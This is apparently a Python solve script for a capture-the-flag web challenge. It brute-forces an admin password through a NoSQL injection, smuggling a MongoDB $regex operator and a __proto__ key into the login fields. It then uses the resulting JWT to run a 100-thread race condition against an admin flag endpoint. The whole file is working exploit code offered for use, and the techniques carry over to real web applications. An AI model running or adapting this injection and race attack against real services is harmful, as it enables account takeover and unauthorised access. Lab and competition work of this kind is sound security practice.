import requests
import string
from requests.adapters import HTTPAdapter
from concurrent.futures import ThreadPoolExecutor
from threading import Barrier

url = 'http://host3.dreamhack.games:9535/'
s = requests.Session()

# bruteforce admin password
admin_pw = ''

for i in range(32):
    for char in string.hexdigits[:16].lower():
        payload = '''"password": { "$regex": "^%s" }''' % (admin_pw + char)

        username = 'admin", "__proto__": { "a": "a'
        password = 'a"}, %s, "username": "admin' % payload

        print("Trying:", char, '|', admin_pw)

        res = s.post(f'{url}/user/login', data={
            'username': username,
            'password': password
        })

        if res.status_code == 403:
            admin_pw += char
            break

print("> Admin password:", admin_pw) 

# login
res = s.post(f'{url}/user/login', data={
    'username': 'admin',
    'password': admin_pw
})

assert 'token' in res.text
print("> Logged in")

token = res.json()['token']
print("> JWT token:", token)

# race condition
headers = {
    'Authorization': f"Bearer {token}"
}

THREADS = 100

session = requests.Session()
adapter = HTTPAdapter(pool_connections=THREADS, pool_maxsize=THREADS, max_retries=0)
session.mount('http://', adapter)
session.headers.update(headers)

def race():
    barrier = Barrier(THREADS)

    def add_flag(_):
        barrier.wait()
        return session.get(f"{url}/admin/flag")

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        list(pool.map(lambda _: session.get(f"{url}/admin"), range(THREADS)))

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        results = list(pool.map(add_flag, range(THREADS)))

    success = sum(r.status_code == 200 for r in results)
    print(f"> Created {success} flags")
    
    return success

for i in range(20):
    requests.delete(f'{url}/admin/flag', headers=headers)

    print(f"> Race attempt {i + 1}")

    if race() > 3:
        res = requests.get(f'{url}/admin/check', headers=headers)
        print("Flag:", res.text)
        break